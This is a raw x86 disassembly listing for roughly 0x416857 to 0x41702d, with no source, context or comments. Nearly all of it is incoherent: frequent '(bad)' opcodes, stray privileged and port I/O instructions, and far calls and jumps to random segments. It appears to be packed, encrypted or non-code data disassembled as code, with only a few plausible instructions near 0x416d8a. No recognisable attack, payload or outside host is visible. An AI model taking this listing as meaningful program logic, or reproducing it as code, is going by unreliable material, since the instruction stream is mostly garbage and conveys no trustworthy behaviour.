  416857:	sbb    BYTE PTR es:[esi-0x34],0xaf
  41685c:	inc    ecx
  41685d:	add    al,0xfb
  41685f:	sub    bl,BYTE PTR [ebx+ecx*8-0x9]
  416863:	(bad)  
  416864:	mov    ebx,0xccdb0db
  416869:	cs dec ebp
  41686b:	icebp  
  41686c:	push   edx
  41686d:	ins    DWORD PTR es:[edi],dx
  41686e:	or     edi,DWORD PTR [esi-0x1]
  416871:	int3   
  416872:	mov    dh,0x1c
  416874:	or     BYTE PTR [ebx-0x2c],dl
  416877:	imul   ebx
  416879:	lea    ebx,[edi]
  41687b:	(bad)  
  41687c:	jnp    0x416827
  41687e:	add    al,0x3c
  416880:	xchg   edi,eax
  416881:	jge    0x416807
  416883:	pop    es
  416884:	rcl    DWORD PTR [ecx-0x14],cl
  416887:	in     al,dx
  416888:	sbb    edi,ebx
  41688a:	lahf   
  41688b:	mov    eax,0xc48eb5cd
  416890:	mov    ebp,0xbd7be64c
  416895:	cmp    BYTE PTR [edi],dh
  416897:	pop    eax
  416898:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416899:	xor    BYTE PTR [ebx],ah
  41689b:	sbb    DWORD PTR [esi],edi
  41689d:	ins    BYTE PTR es:[edi],dx
  41689e:	pop    esi
  41689f:	mov    ebx,0x17dd77fe
  4168a4:	idiv   BYTE PTR [edi-0x5447a811]
  4168aa:	cli    
  4168ab:	sbb    BYTE PTR [eax-0x72],bh
  4168ae:	aam    0x8d
  4168b0:	cmp    BYTE PTR [eax+0x72],ch
  4168b3:	dec    edx
  4168b4:	jbe    0x416884
  4168b6:	aas    
  4168b7:	mov    ah,0x10
  4168b9:	mov    BYTE PTR [edx],ch
  4168bb:	sub    BYTE PTR [eax-0x73395dec],dh
  4168c1:	push   ss
  4168c2:	sub    ebx,DWORD PTR [edi-0x7]
  4168c5:	retf   
  4168c6:	idiv   DWORD PTR [edx+eiz*2+0x62]
  4168ca:	dec    DWORD PTR [ecx+0x8]
  4168cd:	dec    ebx
  4168ce:	xor    DWORD PTR [edx+0x45],eax
  4168d1:	push   cs
  4168d2:	data16 ins BYTE PTR es:[edi],dx
  4168d4:	sbb    al,0xc3
  4168d6:	test   DWORD PTR [eax+0x7806246d],esi
  4168dc:	adc    al,0xa7
  4168de:	dec    esi
  4168df:	xlat   BYTE PTR ds:[ebx]
  4168e0:	mov    dl,BYTE PTR [ecx-0x4e]
  4168e3:	and    ch,BYTE PTR [ebp-0x74]
  4168e6:	std    
  4168e7:	fdiv   QWORD PTR [edx-0x5f]
  4168ea:	lds    edx,FWORD PTR [esi]
  4168ec:	popa   
  4168ed:	add    dl,al
  4168ef:	sbb    ch,0x41
  4168f2:	into   
  4168f3:	sbb    DWORD PTR [ebp+0x3626d347],esp
  4168f9:	icebp  
  4168fa:	call   0xfc82:0x36017850
  416901:	push   ecx
  416902:	xor    DWORD PTR [edx+0x2972a73f],ebp
  416908:	(bad)  
  416909:	sub    BYTE PTR ds:0x6a92584f,al
  41690f:	sub    BYTE PTR [ebp+0x5b],dh
  416912:	and    eax,0x202c3c4b
  416917:	mov    ds:0x17016bfd,eax
  41691c:	cmp    eax,0x609543ed
  416921:	push   esp
  416922:	push   esi
  416923:	pop    eax
  416924:	ror    DWORD PTR [eax+0x4b78331d],cl
  41692a:	ss jl  0x4169a0
  41692d:	stos   DWORD PTR es:[edi],eax
  41692e:	jns    0x4168dc
  416930:	dec    eax
  416931:	mov    WORD PTR [edi+0x28],gs
  416934:	int3   
  416935:	push   esp
  416936:	push   eax
  416937:	or     ecx,ecx
  416939:	int3   
  41693a:	dec    esi
  41693b:	xchg   ebp,eax
  41693c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41693d:	aaa    
  41693e:	cdq    
  41693f:	sbb    edx,ebx
  416941:	dec    ebx
  416942:	jne    0x4169a7
  416944:	xor    BYTE PTR [edi+0x76eef870],dh
  41694a:	push   0xbf4d4568
  41694f:	cs aad 0xde
  416952:	adc    edi,DWORD PTR [edi+0x78c3b3df]
  416958:	cdq    
  416959:	xor    dl,BYTE PTR [ebx+ebp*2]
  41695c:	sub    ecx,ebx
  41695e:	mov    eax,0x99cd3d94
  416963:	adc    dl,BYTE PTR [edx+0x3c24eef7]
  416969:	int3   
  41696a:	into   
  41696b:	sub    esi,ebx
  41696d:	bound  edx,QWORD PTR [edx]
  41696f:	mov    DWORD PTR [edi+0x382bed30],esi
  416975:	imul   esp,DWORD PTR [eax],0x45678443
  41697b:	stc    
  41697c:	add    DWORD PTR [edi],edi
  41697e:	(bad)  
  41697f:	push   0xcf2c5a9f
  416984:	mov    al,ds:0x734b6845
  416989:	ss dec edi
  41698b:	push   es
  41698c:	xor    eax,0x4bc96f28
  416991:	jle    0x4169f3
  416993:	shl    DWORD PTR [edi],cl
  416995:	sub    eax,0xc7d680af
  41699a:	dec    esi
  41699b:	dec    ebp
  41699c:	xchg   ecx,eax
  41699d:	or     BYTE PTR [esi-0x37],bl
  4169a0:	pop    esp
  4169a1:	mov    edi,0x4864e736
  4169a6:	mov    WORD PTR [ecx],gs
  4169a8:	adc    DWORD PTR [ecx+0x37],esi
  4169ab:	mov    eax,ds:0xc923bc26
  4169b0:	aad    0x3d
  4169b2:	or     eax,0x1e52716f
  4169b7:	jb     0x416a13
  4169b9:	stos   DWORD PTR es:[edi],eax
  4169ba:	adc    DWORD PTR [edi],0xffffffce
  4169bd:	xor    al,0x61
  4169bf:	xor    BYTE PTR ds:0xfd48e99c,ch
  4169c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169c6:	cld    
  4169c7:	push   ds
  4169c8:	mov    ch,bh
  4169ca:	or     al,0x13
  4169cc:	dec    ebp
  4169cd:	mov    DWORD PTR [edx-0x299fa65a],esp
  4169d3:	leave  
  4169d4:	iret   
  4169d5:	push   ecx
  4169d6:	loop   0x416968
  4169d8:	dec    edx
  4169d9:	cmp    BYTE PTR [edi-0x24],bh
  4169dc:	test   eax,0x9646db77
  4169e1:	xor    DWORD PTR [eax+0x13657b05],edi
  4169e7:	cmp    eax,0x8bb78282
  4169ec:	sbb    al,0x4f
  4169ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169ef:	popa   
  4169f0:	push   ss
  4169f1:	std    
  4169f2:	xchg   ebp,eax
  4169f3:	or     eax,0xade944
  4169f8:	pop    eax
  4169f9:	add    BYTE PTR [eax],0xb5
  4169fc:	jmp    0x416997
  4169fe:	pop    es
  4169ff:	inc    ebx
  416a00:	jbe    0x416a21
  416a02:	rol    cl,cl
  416a04:	les    ebp,FWORD PTR [ebx-0x4683f31b]
  416a0a:	jl     0x416a83
  416a0c:	in     eax,dx
  416a0d:	gs ss inc edi
  416a10:	lea    eax,[eax]
  416a12:	popf   
  416a13:	outs   dx,DWORD PTR ds:[esi]
  416a14:	(bad)  
  416a15:	aas    
  416a16:	fstp   TBYTE PTR [esi]
  416a18:	pushf  
  416a19:	jns    0x4169c3
  416a1b:	mov    ebx,eax
  416a1d:	aam    0xb1
  416a1f:	inc    edx
  416a20:	retf   
  416a21:	cli    
  416a22:	cwde   
  416a23:	mov    dl,0x5b
  416a26:	pop    edi
  416a27:	popa   
  416a28:	cld    
  416a29:	icebp  
  416a2a:	inc    eax
  416a2b:	fcomi  st,st(4)
  416a2d:	pop    es
  416a2e:	pause  
  416a30:	add    bl,BYTE PTR [ebp+0x4fd945af]
  416a36:	jno    0x416a44
  416a38:	push   edx
  416a39:	sar    ebp,1
  416a3b:	popf   
  416a3c:	loop   0x4169f7
  416a3e:	pop    eax
  416a3f:	inc    esi
  416a40:	push   0xf
  416a42:	fisttp WORD PTR [edi-0x5a]
  416a45:	icebp  
  416a46:	mov    ebx,0x45edcbad
  416a4b:	call   0x805222e8
  416a50:	inc    ebx
  416a51:	cdq    
  416a52:	pushf  
  416a53:	bound  ecx,QWORD PTR [edi+0x3e1dd97d]
  416a59:	sbb    eax,0x631a03e5
  416a5e:	adc    dh,BYTE PTR [edi+0x1b3b5d70]
  416a64:	and    ebp,DWORD PTR [ebp-0x2b]
  416a67:	push   edi
  416a68:	fisub  DWORD PTR fs:[ecx]
  416a6b:	dec    ebx
  416a6c:	xchg   ebp,eax
  416a6d:	out    dx,eax
  416a6e:	dec    edi
  416a6f:	out    dx,eax
  416a70:	(bad)  
  416a72:	mov    dl,0xda
  416a74:	push   edi
  416a75:	jmp    0x416a35
  416a77:	xchg   ebx,eax
  416a78:	adc    eax,0x2098a188
  416a7d:	mov    al,0xd7
  416a7f:	cld    
  416a80:	and    edx,ecx
  416a82:	arpl   WORD PTR [ebp+0x42],ax
  416a85:	call   0x1fb:0xa2d619e8
  416a8c:	jg     0x416a19
  416a8e:	aad    0x50
  416a90:	sbb    al,0xb3
  416a92:	cmp    eax,0x2baaba1d
  416a97:	dec    ecx
  416a98:	call   0x3f589829
  416a9d:	(bad)  
  416a9e:	lahf   
  416a9f:	aam    0x26
  416aa1:	loope  0x416ac0
  416aa3:	adc    cl,BYTE PTR [edx]
  416aa5:	(bad)  [edi]
  416aa7:	mov    esi,0x51defab0
  416aac:	loop   0x416acb
  416aae:	pop    ds
  416aaf:	(bad)  
  416ab0:	or     eax,esi
  416ab2:	or     eax,0xa15a2858
  416ab7:	xchg   ebx,eax
  416ab8:	fcom   QWORD PTR [ebx]
  416aba:	sar    esp,cl
  416abc:	and    eax,0x458bc15f
  416ac1:	cld    
  416ac2:	jmp    0x416d7a
  416ac7:	rol    dl,1
  416ac9:	(bad)  
  416aca:	iret   
  416acb:	fcmovbe st,st(5)
  416acd:	fcmovne st,st(1)
  416acf:	mov    eax,0xff64ff75
  416ad4:	cmp    al,0x72
  416ad6:	mov    edx,DWORD PTR [ebx-0x6a8780e0]
  416adc:	jle    0x416b56
  416ade:	js     0x416ac0
  416ae0:	jle    0x416b2d
  416ae2:	push   esi
  416ae3:	in     al,0xd1
  416ae5:	cmp    ebx,esp
  416ae7:	add    ebp,edi
  416ae9:	in     ax,dx
  416aeb:	cld    
  416aec:	mov    edi,0xf9c50be
  416af1:	inc    ebp
  416af2:	xchg   esi,eax
  416af3:	jle    0x416ad0
  416af5:	repz gs ss in eax,0x51
  416afa:	inc    esp
  416afb:	mov    ?,WORD PTR [esi+0x12]
  416afe:	and    eax,0x9c35a341
  416b03:	mov    dl,0x67
  416b05:	sbb    ch,BYTE PTR [edi-0x7e]
  416b08:	pop    esi
  416b09:	xchg   ecx,ecx
  416b0b:	adc    ch,BYTE PTR [edi+0x61]
  416b0e:	mov    bl,0x7a
  416b10:	bound  ecx,QWORD PTR [ebx+ebp*4+0x79]
  416b14:	push   cs
  416b15:	inc    edx
  416b16:	test   eax,0x15350d04
  416b1b:	inc    edx
  416b1c:	and    dh,BYTE PTR [edi+0x5ccada55]
  416b22:	xor    al,0xae
  416b24:	mov    bl,0xdb
  416b26:	fsub   st(5),st
  416b28:	pop    ebp
  416b29:	xor    eax,0xb09d893c
  416b2e:	inc    edi
  416b2f:	stos   DWORD PTR es:[edi],eax
  416b30:	sub    DWORD PTR [ebp-0x598f3241],0x6ac199f6
  416b3a:	rol    ebp,cl
  416b3c:	jnp    0x416b78
  416b3e:	scas   eax,DWORD PTR es:[edi]
  416b3f:	pop    edx
  416b40:	jnp    0x416b5d
  416b42:	jns    0x416ac6
  416b44:	pop    edx
  416b45:	mov    ds:0xdd1b7588,al
  416b4b:	es push ecx
  416b4d:	stc    
  416b4e:	dec    ebp
  416b4f:	mov    dh,BYTE PTR [edx-0x3c]
  416b52:	mov    bl,0xc7
  416b54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b55:	pop    esp
  416b56:	icebp  
  416b57:	lods   eax,DWORD PTR ds:[esi]
  416b58:	int3   
  416b59:	fnsave [edx-0x598d4e94]
  416b5f:	cmovg  esi,DWORD PTR [ecx-0x50]
  416b63:	jae    0x416bdd
  416b65:	dec    ebp
  416b66:	mov    al,fs:0x743b82d5
  416b6c:	bound  esi,QWORD PTR [ebx+0x26644bd7]
  416b72:	mov    bl,0x26
  416b74:	sub    BYTE PTR [ebx+edi*2],dh
  416b77:	mov    ds:0x10547eaa,eax
  416b7c:	mov    ecx,DWORD PTR [edi]
  416b7e:	add    DWORD PTR [ecx-0x77],ebx
  416b81:	mov    DWORD PTR [esi-0x38],esi
  416b84:	push   ecx
  416b85:	pop    es
  416b86:	jmp    DWORD PTR [ecx-0x738cf72c]
  416b8c:	sub    cl,BYTE PTR [eax+eax*2]
  416b8f:	jge    0x416b1a
  416b91:	test   dl,ah
  416b93:	mov    dh,0xc6
  416b95:	mov    DWORD PTR [ebx+0xe340321],edi
  416b9b:	xchg   DWORD PTR [ecx],ebp
  416b9d:	dec    ebx
  416b9e:	dec    ebp
  416b9f:	test   al,0x60
  416ba1:	jo     0x416c05
  416ba3:	dec    esp
  416ba4:	popa   
  416ba5:	stos   DWORD PTR es:[edi],eax
  416ba6:	jl     0x416b4e
  416ba8:	in     al,0x28
  416baa:	push   ebx
  416bab:	xchg   ebx,eax
  416bac:	pop    ecx
  416bad:	mov    esp,0x648e8be5
  416bb2:	sbb    al,0x88
  416bb4:	out    dx,eax
  416bb5:	fistp  WORD PTR [ebx+eax*2]
  416bb8:	xor    edi,DWORD PTR [ecx+0x204786ae]
  416bbe:	mov    eax,ds:0xdae72926
  416bc3:	inc    esp
  416bc4:	mov    esi,0x35327f7b
  416bc9:	add    DWORD PTR [esi],0x18
  416bcc:	push   esi
  416bcd:	lahf   
  416bce:	and    bh,BYTE PTR [ebx]
  416bd0:	lods   eax,DWORD PTR ds:[esi]
  416bd1:	mov    dh,0x4c
  416bd3:	das    
  416bd4:	jbe    0x416c4c
  416bd6:	les    eax,FWORD PTR [esp+ecx*1+0x42]
  416bda:	pop    ebp
  416bdb:	clc    
  416bdc:	loopne 0x416b9c
  416bde:	add    al,0x69
  416be0:	pop    ecx
  416be1:	(bad)
  416be4:	cli    
  416be5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416be6:	inc    esp
  416be7:	scas   eax,DWORD PTR es:[edi]
  416be8:	add    BYTE PTR [ecx],dl
  416bea:	pop    edx
  416beb:	mov    cs,edx
  416bed:	pop    esp
  416bee:	push   ecx
  416bef:	pop    ss
  416bf0:	xchg   edx,eax
  416bf1:	nop
  416bf2:	retf   0xb12b
  416bf5:	mov    edi,DWORD PTR [ecx]
  416bf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bf8:	or     DWORD PTR [ebx],edx
  416bfa:	and    eax,DWORD PTR [ebx-0x13836d4f]
  416c00:	jmp    0xe207:0x7766ecf7
  416c07:	lods   eax,DWORD PTR ds:[esi]
  416c08:	inc    ebx
  416c09:	mov    eax,0x2dd5cd11
  416c0e:	(bad)  
  416c0f:	lock adc ah,BYTE PTR [eax-0x1fafd83c]
  416c16:	sahf   
  416c17:	mov    edx,0xdd10290c
  416c1c:	xor    dl,al
  416c1e:	std    
  416c1f:	outs   dx,DWORD PTR ds:[esi]
  416c20:	pop    ss
  416c21:	push   ss
  416c22:	mov    esp,0x809c0f59
  416c27:	pushf  
  416c28:	daa    
  416c29:	fcmovnb st,st(4)
  416c2b:	xchg   edx,eax
  416c2c:	add    dh,dl
  416c2e:	adc    ch,0x23
  416c31:	jne    0x416bd1
  416c33:	(bad)  
  416c34:	pop    ecx
  416c35:	jo     0x416bee
  416c37:	sahf   
  416c38:	out    0x52,al
  416c3a:	daa    
  416c3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c3c:	bound  edx,QWORD PTR [ecx]
  416c3e:	nop
  416c3f:	mov    esp,0xb4c11353
  416c44:	xchg   ecx,eax
  416c45:	jle    0x416bdb
  416c47:	jno    0x416c69
  416c49:	push   esi
  416c4a:	sar    ch,cl
  416c4c:	hlt    
  416c4d:	and    BYTE PTR [esi],dl
  416c4f:	shl    DWORD PTR [edi+0x21],1
  416c52:	cmp    eax,0xd0dfd344
  416c57:	adc    dh,BYTE PTR [ecx+0x7d]
  416c5a:	mov    eax,ds:0x139f2182
  416c5f:	sahf   
  416c60:	mov    dh,BYTE PTR [edi+0x706436aa]
  416c66:	int3   
  416c67:	pop    edx
  416c68:	mov    al,dl
  416c6a:	in     eax,dx
  416c6b:	or     ecx,esp
  416c6d:	call   0xad4d:0xba2418c9
  416c74:	sub    BYTE PTR [esi+0xda3ef9a],bl
  416c7a:	inc    edi
  416c7b:	jo     0x416cd9
  416c7d:	add    BYTE PTR [eax],al
  416c7f:	popf   
  416c80:	pusha  
  416c81:	int3   
  416c82:	mov    ch,0x4b
  416c84:	inc    ebx
  416c85:	in     eax,0x82
  416c87:	(bad)  
  416c88:	in     eax,dx
  416c89:	scas   al,BYTE PTR es:[edi]
  416c8a:	or     DWORD PTR [edx+0x722b20da],ebp
  416c90:	sbb    al,0xfa
  416c92:	cdq    
  416c93:	mov    ah,0x83
  416c95:	rcr    BYTE PTR [ecx],0x55
  416c98:	shr    BYTE PTR [esi+0x33],0x3b
  416c9c:	jb     0x416d01
  416c9e:	lea    eax,[ecx+0xa89a36b]
  416ca4:	mov    ebx,0xf47399b0
  416ca9:	ss xor dl,dl
  416cac:	aam    0xf0
  416cae:	iret   
  416caf:	jne    0x416c3d
  416cb1:	fidiv  WORD PTR [ebx-0x6436e296]
  416cb7:	loope  0x416d0c
  416cb9:	mov    bl,0xab
  416cbb:	es push ds
  416cbd:	mov    ds:0x20f713b,al
  416cc2:	ror    DWORD PTR [eax+ecx*1],cl
  416cc5:	mov    eax,ds:0x7a75601d
  416cca:	and    eax,0x5f9a884e
  416ccf:	push   edx
  416cd0:	ja     0x416cc3
  416cd2:	call   0xa750:0x965864c8
  416cd9:	push   edi
  416cda:	xchg   esp,eax
  416cdb:	arpl   WORD PTR ds:0xc6209828,ax
  416ce1:	mov    ch,0xab
  416ce3:	(bad)  
  416ce4:	(bad)  ds:0xd06d84cc
  416cea:	frstor [esi]
  416cec:	out    0x83,eax
  416cee:	xor    eax,0xfb87f0f5
  416cf3:	sbb    bl,dl
  416cf5:	lock sub DWORD PTR [ebp+0x0],edx
  416cf9:	sbb    al,0x8
  416cfb:	mov    dl,0xc4
  416cfd:	ja     0x416d19
  416cff:	ret    
  416d00:	dec    ebp
  416d01:	or     eax,0x82b476ea
  416d06:	sbb    esi,DWORD PTR [esi-0x23]
  416d09:	mov    edx,0x39bc9109
  416d0e:	add    esp,DWORD PTR [eax]
  416d10:	sub    edi,esp
  416d12:	mov    edx,0x72ddaf73
  416d17:	adc    ebx,DWORD PTR [ebx-0x12550230]
  416d1d:	(bad)  
  416d1e:	out    dx,eax
  416d1f:	jmp    0xe1f9:0xe8c59307
  416d26:	call   0xfaa8:0xd88d2def
  416d2d:	stos   BYTE PTR es:[edi],al
  416d2e:	jbe    0x416d48
  416d30:	jge    0x416d66
  416d32:	sub    BYTE PTR [ebp+eiz*1-0x5a],0xdc
  416d37:	dec    edx
  416d38:	popa   
  416d39:	inc    edx
  416d3a:	rol    ch,1
  416d3c:	stos   DWORD PTR es:[edi],eax
  416d3d:	or     eax,DWORD PTR [eax+0x25]
  416d40:	jecxz  0x416ce6
  416d42:	mov    edx,0x665ee069
  416d47:	les    eax,FWORD PTR [edx]
  416d49:	lods   al,BYTE PTR ds:[esi]
  416d4a:	mov    eax,0x141c8ed4
  416d4f:	ret    0x8d2a
  416d52:	out    dx,al
  416d53:	add    ebp,ecx
  416d55:	cwde   
  416d56:	mov    gs,WORD PTR ds:0xa5d30c3a
  416d5c:	lods   al,BYTE PTR ds:[si]
  416d5e:	nop
  416d5f:	pop    ss
  416d60:	jmp    0xcada067a
  416d65:	retf   0xa14e
  416d68:	dec    ebp
  416d69:	xchg   ebp,ebp
  416d6b:	add    BYTE PTR [esi-0x565a1e63],dl
  416d71:	jns    0x416d7f
  416d73:	jmp    DWORD PTR [ebp+0x45]
  416d76:	mov    al,ds:0x8b89d7a0
  416d7b:	dec    ebp
  416d7c:	adc    BYTE PTR [ebx],dh
  416d7e:	mov    DWORD PTR [ebx],0xfc13bc6
  416d84:	test   DWORD PTR [ebx-0x74fffffb],edx
  416d8a:	inc    ebp
  416d8b:	cld    
  416d8c:	xor    eax,edi
  416d8e:	add    eax,esi
  416d90:	mov    ds:0x41eb6a,eax
  416d95:	mov    eax,DWORD PTR [ebp-0x4]
  416d98:	xor    eax,edi
  416d9a:	jmp    0x417052
  416d9f:	xlat   BYTE PTR ds:[ebx]
  416da0:	cmp    eax,0xd9dac7cc
  416da5:	fcmovne st,st(5)
  416da7:	push   ecx
  416da8:	call   0x6333:0xaf7d1efb
  416daf:	sub    BYTE PTR ds:0x7e95787f,ah
  416db5:	js     0x416e2f
  416db7:	enter  0x99a9,0x1e
  416dbb:	in     eax,0x3f
  416dbd:	and    ah,ah
  416dbf:	call   ebx
  416dc1:	shr    DWORD PTR [eax],1
  416dc3:	je     0x416de1
  416dc5:	fmul   DWORD PTR [edx+0x169eae6]
  416dcb:	or     ecx,DWORD PTR ds:0x7a4ca7d4
  416dd1:	ds pop eax
  416dd3:	loop   0x416d5d
  416dd5:	mov    ds:0xdb57ebff,eax
  416dda:	xchg   ebp,eax
  416ddb:	add    ch,dh
  416ddd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416dde:	imul   edi,DWORD PTR [edx],0x7f
  416de1:	dec    ebx
  416de2:	inc    edx
  416de3:	mov    ebp,0xe89f97c3
  416de8:	mov    BYTE PTR [edx-0x10a58a15],dh
  416dee:	push   edx
  416def:	inc    ebx
  416df0:	xchg   edx,eax
  416df1:	mov    bh,0xc6
  416df3:	xchg   edi,eax
  416df4:	inc    esi
  416df5:	mov    ebp,DWORD PTR [eax]
  416df7:	mov    dl,0x97
  416df9:	es test al,0x65
  416dfc:	addr16 cli 
  416dfe:	mov    bh,0xcc
  416e00:	jl     0x416e4b
  416e02:	fadd   DWORD PTR [esp+ebp*4+0x15]
  416e06:	inc    DWORD PTR [esi+eax*1+0x2f99b93c]
  416e0d:	jo     0x416e7b
  416e0f:	repnz imul BYTE PTR ds:0xdec3ae58
  416e16:	arpl   di,bx
  416e18:	add    eax,0xd3cb818a
  416e1d:	jmp    0xff8b0df6
  416e22:	(bad)  
  416e23:	push   0x2b
  416e25:	aad    0xf8
  416e27:	sbb    al,0x30
  416e29:	out    0xa9,eax
  416e2b:	or     al,0xa0
  416e2d:	inc    ecx
  416e2e:	adc    esp,0x5066023d
  416e34:	in     al,0xbd
  416e36:	mov    esp,0x34ffaf2
  416e3b:	mov    ds:0x1945b961,eax
  416e40:	test   al,0x2f
  416e42:	pop    esp
  416e43:	pusha  
  416e44:	and    BYTE PTR [esi-0x20],0x91
  416e48:	mov    BYTE PTR [edi*8+0x436dfb92],dh
  416e4f:	arpl   WORD PTR [esi+0x54],bp
  416e52:	inc    esp
  416e53:	adc    DWORD PTR [edx],0xffffff8b
  416e56:	leave  
  416e57:	loope  0x416e46
  416e59:	cmp    DWORD PTR [ebx],ecx
  416e5b:	pop    ecx
  416e5c:	rcr    edi,cl
  416e5e:	retf   
  416e5f:	pop    esi
  416e60:	aaa    
  416e61:	xor    esp,DWORD PTR [edx+0x76]
  416e64:	std    
  416e65:	nop
  416e66:	adc    ah,ah
  416e68:	ss pushf 
  416e6a:	adc    al,0x15
  416e6c:	pop    ecx
  416e6d:	lahf   
  416e6e:	and    ah,BYTE PTR [esi+0x3e9e186d]
  416e74:	push   ebp
  416e75:	cs jne 0x416e28
  416e78:	mov    ecx,0xbecbfb82
  416e7d:	daa    
  416e7e:	stc    
  416e7f:	xacquire xchg DWORD PTR ds:0xac01ec9d,ebp
  416e86:	xor    eax,0xbf353b8e
  416e8b:	adc    ebx,esi
  416e8d:	push   edi
  416e8e:	outs   dx,DWORD PTR ds:[esi]
  416e8f:	rcl    esp,0x76
  416e92:	xor    al,0x6c
  416e94:	jp     0x416e38
  416e96:	xchg   edi,eax
  416e97:	call   0x5546e643
  416e9c:	push   esp
  416e9d:	jle    0x2e4f5e44
  416ea3:	cmp    DWORD PTR [ebx],0xffffff98
  416ea6:	pop    ebp
  416ea7:	dec    ebp
  416ea8:	and    DWORD PTR [eax],edx
  416eaa:	bswap  edx
  416eac:	xor    dl,cl
  416eae:	cmp    al,0x96
  416eb0:	enter  0xf1d4,0x8c
  416eb4:	pop    esi
  416eb5:	retf   
  416eb6:	sahf   
  416eb7:	dec    ebx
  416eb8:	mov    ds:0x595fac3c,al
  416ebd:	and    ebp,DWORD PTR ss:[edx]
  416ec0:	dec    esi
  416ec1:	outs   dx,BYTE PTR ds:[esi]
  416ec2:	lea    edx,[esp+eiz*8-0x71]
  416ec6:	js     0x416e95
  416ec8:	mov    bl,0x9c
  416eca:	fiadd  WORD PTR [edx+0x4e7b583e]
  416ed0:	ins    DWORD PTR es:[edi],dx
  416ed1:	or     BYTE PTR fs:[ebx+0x1462f868],bl
  416ed8:	xchg   ecx,eax
  416ed9:	shr    BYTE PTR [eax],1
  416edb:	fs mov ebx,0x210fc19e
  416ee1:	sbb    BYTE PTR [edi],dh
  416ee3:	mov    edx,0x90d16e1f
  416ee8:	push   eax
  416ee9:	cwde   
  416eea:	xchg   ebx,eax
  416eeb:	xchg   esi,eax
  416eec:	push   edx
  416eed:	push   0xf
  416eef:	dec    ecx
  416ef0:	pop    edx
  416ef1:	sti    
  416ef2:	int3   
  416ef3:	clc    
  416ef4:	call   0x3168:0x3b92f261
  416efb:	jmp    0x416f0c
  416efd:	push   ss
  416efe:	mov    eax,ds:0x6ee24c93
  416f03:	sahf   
  416f04:	dec    ebp
  416f05:	loop   0x416eed
  416f07:	mov    ds:0xfd51b905,eax
  416f0c:	jl     0x416eb9
  416f0e:	test   DWORD PTR ds:0xb9be726c,edi
  416f14:	xor    DWORD PTR [edi-0x37],eax
  416f17:	out    dx,al
  416f18:	lahf   
  416f19:	mov    ch,0x76
  416f1b:	pop    eax
  416f1c:	repnz xor DWORD PTR [eax],0x60
  416f20:	or     eax,0x9ac82330
  416f25:	sbb    ebp,DWORD PTR [ebx-0x4b884f54]
  416f2b:	cmp    esp,DWORD PTR ds:0x4192a6f7
  416f31:	push   bp
  416f33:	pop    eax
  416f34:	inc    ebp
  416f35:	or     eax,0x68f2962d
  416f3a:	cmp    BYTE PTR [eax-0x17],dh
  416f3d:	xchg   BYTE PTR [ecx-0x23],dh
  416f40:	push   0xd
  416f42:	retf   0x19ec
  416f45:	test   DWORD PTR [esi],esp
  416f47:	cmp    BYTE PTR [edx-0x5cf036ef],bh
  416f4d:	fcmovb st,st(6)
  416f4f:	(bad)  
  416f50:	into   
  416f51:	cdq    
  416f52:	sbb    ah,BYTE PTR [edx]
  416f54:	pop    eax
  416f55:	repz das 
  416f57:	mov    BYTE PTR [edx],ch
  416f59:	dec    eax
  416f5a:	ss sbb eax,0x39ff3004
  416f60:	aam    0x97
  416f62:	repnz mov BYTE PTR [edi-0x3a2a8424],al
  416f69:	lea    esi,[ebx-0x28]
  416f6c:	aaa    
  416f6d:	jnp    0x416fd7
  416f6f:	les    edi,FWORD PTR [eax]
  416f71:	and    eax,0x6988b921
  416f76:	rcl    al,cl
  416f78:	xchg   esp,eax
  416f79:	mov    al,0x7c
  416f7b:	(bad)  
  416f7c:	int3   
  416f7d:	sub    al,0xcb
  416f7f:	sub    BYTE PTR [esi+0x39],0xfc
  416f83:	rcl    DWORD PTR [eax-0x51f0f14f],1
  416f89:	mov    eax,0xaee9b5b7
  416f8e:	and    DWORD PTR [edx-0x16],esp
  416f91:	dec    edx
  416f92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f93:	mov    al,0xc5
  416f95:	daa    
  416f96:	sbb    ch,0x84
  416f99:	jge    0x416fac
  416f9b:	jmp    0xf6a1c3b7
  416fa0:	les    ebx,FWORD PTR [esi+0x1c]
  416fa3:	lea    ebx,[ebx+0x60]
  416fa6:	push   es
  416fa7:	aaa    
  416fa8:	test   al,0x84
  416faa:	sbb    ebp,edx
  416fac:	jmp    0x7fd5859b
  416fb1:	sbb    ch,ah
  416fb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416fb4:	daa    
  416fb5:	cmp    BYTE PTR [ecx],dl
  416fb7:	sub    edi,0x71c70f84
  416fbd:	xchg   esi,eax
  416fbe:	inc    edx
  416fbf:	ret    0x5c01
  416fc2:	and    DWORD PTR [esi+0x7c],esi
  416fc5:	add    eax,0x91d860eb
  416fca:	fs add al,0xc
  416fcd:	inc    ebp
  416fce:	es cmp eax,0x942c7f0f
  416fd4:	mov    esi,0xc6d475b7
  416fd9:	jbe    0x416f65
  416fdb:	dec    edi
  416fdc:	mov    bh,0x74
  416fde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fdf:	mov    dl,0x64
  416fe1:	mov    edi,0x88276b0a
  416fe6:	mov    ebp,0xa8c67f02
  416feb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fec:	inc    ebp
  416fed:	ror    BYTE PTR [ecx+0x4e],0xc1
  416ff1:	jmp    0xa8bc:0x15c2e03b
  416ff8:	push   0x907f169f
  416ffd:	jmp    0x13cebc40
  417002:	mov    al,ds:0x61c66f26
  417007:	or     BYTE PTR [esi+eax*1-0x7c],bh
  41700b:	jmp    0xe7f63d9
  417010:	sbb    ebx,DWORD PTR [edx]
  417012:	ror    edx,1
  417014:	cmp    eax,0xd13605ec
  417019:	pop    es
  41701a:	aaa    
  41701b:	xlat   BYTE PTR ds:[ebx]
  41701c:	xor    eax,0xa1d744f0
  417021:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417022:	xor    eax,0xeae40874
  417027:	sbb    ebp,DWORD PTR ds:0xdc62706f
  41702d:	adc    bh,BYTE PTR [esp+eax*4]
